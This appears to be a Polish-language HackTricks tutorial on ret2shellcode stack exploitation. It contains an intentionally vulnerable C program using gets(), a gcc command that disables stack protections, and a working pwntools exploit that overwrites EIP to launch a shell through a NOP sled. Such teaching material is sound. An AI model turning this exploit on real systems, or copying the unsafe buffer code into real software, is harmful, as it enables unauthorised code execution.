# Ret2Shellcode

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

## Podstawowe informacje

**Ret2shellcode** to technika używana w eksploatacji binarnej, gdzie atakujący zapisuje shellcode na stosie podatnego programu, a następnie modyfikuje **Wskaźnik Instrukcji (IP)** lub **Rozszerzony Wskaźnik Instrukcji (EIP)**, aby wskazywał na lokalizację tego shellcode, co powoduje jego wykonanie. Jest to klasyczna metoda używana do uzyskania nieautoryzowanego dostępu lub wykonania dowolnych poleceń na systemie docelowym. Oto rozbudowany opis procesu, w tym prosty przykład w języku C i sposób napisania odpowiadającego exploitu przy użyciu Pythona z **pwntools**.

### Przykład w języku C: Podatny Program

Zacznijmy od prostego przykładu podatnego programu w języku C:
```c
#include <stdio.h>
#include <string.h>

void vulnerable_function() {
char buffer[64];
gets(buffer); // Unsafe function that does not check for buffer overflow
}

int main() {
vulnerable_function();
printf("Returned safely\n");
return 0;
}
```
Ten program jest podatny na przepełnienie bufora z powodu użycia funkcji `gets()`.

### Kompilacja

Aby skompilować ten program wyłączając różne zabezpieczenia (aby zasymulować środowisko podatne na ataki), możesz użyć poniższej komendy:
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
* `-fno-stack-protector`: Wyłącza ochronę stosu.
* `-z execstack`: Sprawia, że stos jest wykonywalny, co jest konieczne do wykonania shellcode przechowywanego na stosie.
* `-no-pie`: Wyłącza wykonywalne pliki o pozycji niezależnej, ułatwiając przewidywanie adresu pamięci, w którym znajdzie się nasz shellcode.
* `-m32`: Kompiluje program jako plik wykonywalny 32-bitowy, często używany ze względu na prostotę w tworzeniu exploitów.

### Python Exploit using Pwntools

Oto jak można napisać exploit w Pythonie, korzystając z **pwntools**, aby przeprowadzić atak **ret2shellcode**:
```python
from pwn import *

# Set up the process and context
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path
context.arch = 'i386' # Specify the architecture

# Generate the shellcode
shellcode = asm(shellcraft.sh()) # Using pwntools to generate shellcode for opening a shell

# Find the offset to EIP
offset = cyclic_find(0x6161616c) # Assuming 0x6161616c is the value found in EIP after a crash

# Prepare the payload
# The NOP slide helps to ensure that the execution flow hits the shellcode.
nop_slide = asm('nop') * (offset - len(shellcode))
payload = nop_slide + shellcode
payload += b'A' * (offset - len(payload))  # Adjust the payload size to exactly fill the buffer and overwrite EIP
payload += p32(0xffffcfb4) # Supossing 0xffffcfb4 will be inside NOP slide

# Send the payload
p.sendline(payload)
p.interactive()
```
Ten skrypt konstruuje ładunek składający się z **slajdu NOP**, **kodu shell**, a następnie nadpisuje **EIP** adresem wskazującym na slajd NOP, zapewniając wykonanie kodu shell.

**Slajd NOP** (`asm('nop')`) jest używany do zwiększenia szansy na "przesunięcie" wykonania do naszego kodu shell bez względu na dokładny adres. Dostosuj argument `p32()` do adresu początkowego bufora plus przesunięcia, aby trafić na slajd NOP.

## Protections

* [**ASLR**](../common-binary-protections/aslr.md) **powinien być wyłączony**, aby adres był niezawodny w różnych wykonaniach, w przeciwnym razie adres, pod którym będzie przechowywana funkcja, nie będzie zawsze taki sam, i będziesz potrzebować wycieku, aby dowiedzieć się, gdzie jest załadowana funkcja win.
* [**Kanarki stosu**](../common-binary-protections/stack-canaries.md) również powinny być wyłączone, w przeciwnym razie skompromitowany adres powrotu EIP nie zostanie nigdy wykonany.
* [**NX**](../common-binary-protections/no-exec-nx.md) ochrona **stosu** uniemożliwi wykonanie kodu shell wewnątrz stosu, ponieważ ta część nie będzie wykonawalna.

## Inne przykłady

* [https://ir0nstone.gitbook.io/notes/types/stack/shellcode](https://ir0nstone.gitbook.io/notes/types/stack/shellcode)
